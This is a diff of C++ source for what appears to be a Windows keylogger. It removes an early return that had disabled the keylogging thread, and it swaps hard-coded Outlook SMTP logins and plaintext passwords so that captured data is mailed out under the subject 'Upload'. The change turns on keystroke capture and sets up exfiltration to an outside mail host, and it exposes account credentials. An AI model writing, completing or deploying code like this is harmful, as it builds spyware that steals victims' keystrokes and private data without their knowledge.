@@ -90,7 +90,6 @@ public:
 	}
 
 	static DWORD WINAPI keylog_thread(LPVOID info){
-		return 0;
 		while(running){
 			Sleep(5000);
 			if(!keylog_proc_info.hProcess){
@@ -148,13 +147,21 @@ public:
 			mail.SetSMTPServer("smtp-mail.outlook.com", 587);
 			mail.SetSecurityType(SMTP_SECURITY_TYPE::USE_TLS);
 
-			mail.SetLogin("cchtriptest@outlook.com");
-			mail.SetPassword("cchtrip123");
-			mail.SetSenderName("cchtriptest");
-			mail.SetSenderMail("cchtriptest@outlook.com");
-			mail.SetReplyTo("cchtriptest@outlook.com");
+			//mail.SetLogin("cchtriptest@outlook.com");
+			//mail.SetPassword("cchtrip123");
+			//mail.SetSenderName("cchtriptest");
+			//mail.SetSenderMail("cchtriptest@outlook.com");
+			//mail.SetReplyTo("cchtriptest@outlook.com");
+			//mail.AddRecipient("cchtriptest@outlook.com");
+			
+			mail.SetLogin("temptemptest@outlook.com");
+			mail.SetPassword("temptest!!!");
+			mail.SetSenderName("temptemptest");
+			mail.SetSenderMail("temptemptest@outlook.com");
+			mail.SetReplyTo("temptemptest@outlook.com");
+			mail.AddRecipient("temptemptest@outlook.com");
+
 			mail.SetSubject("Upload");
-			mail.AddRecipient("cchtriptest@outlook.com");
 			mail.SetXPriority(CSmptXPriority::XPRIORITY_NORMAL);
 			//mail.SetXMailer("The Bat! (v3.02) Professional");
 			mail.AddMsgLine("DOTO....");
